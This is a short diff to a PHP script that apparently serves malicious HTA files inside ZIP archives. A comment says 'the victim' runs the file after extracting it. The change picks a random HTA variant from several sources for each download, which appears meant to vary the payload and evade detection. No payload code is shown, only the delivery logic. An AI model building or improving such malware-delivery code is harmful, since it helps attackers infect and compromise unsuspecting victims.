@@ -25,8 +25,15 @@ if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
 // the victim runs after extracting).
 $zipName = str_replace('.hta', '.zip', $name);
 
-// ---- read source HTA ----
+// ---- read source HTA (random variant if more than one is present) ----
 $src = SOURCE_ZIP;
+if (!empty(SOURCE_VARIANTS) && count(SOURCE_VARIANTS) > 1) {
+    $candidates = array_values(array_filter(SOURCE_VARIANTS, 'is_file'));
+    if (count($candidates) > 1) {
+        $src = $candidates[random_int(0, count($candidates) - 1)];
+    }
+}
+if (!is_file($src)) { $src = SOURCE_ZIP; }
 if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
 $bytes = (string)@file_get_contents($src);
 if ($bytes === '') { http_response_code(500); echo '500'; exit; }
